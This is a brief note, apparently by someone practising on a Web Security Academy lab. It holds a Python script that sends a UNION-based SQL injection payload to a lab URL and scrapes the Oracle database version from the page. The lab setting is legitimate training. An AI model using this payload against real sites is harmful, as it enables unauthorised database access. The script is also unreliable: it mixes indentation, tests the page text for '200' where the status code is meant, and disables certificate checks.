First created in Jupyter. I wanted to try it out and while i wouldn't use it all the time i can see it is absolutely great at certain tasks like web scraping. 

```python
import requests
import urllib3
from bs4 import BeautifulSoup
import re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

path = 'https://0a4100520480a53c8201cada005d0006.web-security-academy.net/filter?category=Pets/'

exploit = "'+UNION+SELECT+banner,+NULL+FROM+v$version--"

r = requests.get(path + exploit, verify=False)

if '200' in r.text:
    res = r.text
    
    soup = BeautifulSoup(res, 'html.parser')
	version = soup.find(string=re.compile('.*Oracle\sDatabase*.'))
print(version)
```

Very Basic script that i will remake tomorrow.
